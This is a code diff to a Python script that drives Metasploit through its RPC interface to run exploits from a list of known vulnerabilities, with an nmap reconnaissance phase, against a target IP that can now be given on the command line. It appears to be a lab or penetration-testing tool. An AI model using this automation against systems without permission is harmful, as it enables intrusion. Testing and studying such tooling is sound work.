@@ -13,12 +13,11 @@ from knownVulnerabilities import vulnerabilities
 
 if __name__ == "__main__":
     #############################################################################
-    ### UNCOMMENT THIS TO RUN THE PROGRAM, THEN COMMENT THIS OUT ONCE YOU RUN THE 
-    # PROGRAM ONCE, this must run every time you restart ###
-    # proc1 = subprocess.Popen(["./setup.sh"])
+    # RUN ./setup.sh TO SET EVERYTHING UP.  This is for automating the exploit only
+    # proc1 = subprocess.Popen(["yes | ./setup.sh"])
+    # print("FINISHED SETTING UP SERVER")
     # time.sleep(180)
     # proc1.kill()
-    ### COMMENT THIS OUT ONCE YOU RUN THE PROGRAM ONCE, must run every time you restart ###
 
     # basically starts metasploit and kill all previous sessions 
     client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
@@ -28,10 +27,12 @@ if __name__ == "__main__":
 
     ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
     # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
-    vulnerability = vulnerabilities[3]
+    vulnerability = vulnerabilities[2]
     print(vulnerability.description)
     print(vulnerability.module)
-    RHOSTS = "192.168.1.162" # PUT YOUR HOST HERE
+    RHOSTS = "192.168.130.128" # PUT YOUR HOST HERE
+    if len(sys.argv) > 1:
+        RHOSTS = sys.argv[1]
     module = vulnerability.module
     exploit = client.modules.use(vulnerability.exploitType, module)
     print(exploit)
@@ -53,7 +54,9 @@ if __name__ == "__main__":
     ######### TEST
 
     ######## RECONAISSANCE PHASE ########
-    RHOSTS = "192.168.1.162"
+    RHOSTS = "192.168.130.128"
+    if len(sys.argv) > 1:
+        RHOSTS = sys.argv[1]
     nmapAggressiveness = 2
     # in order of increasing levels of fucking around (and also in increasing levels of finding out)
     nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
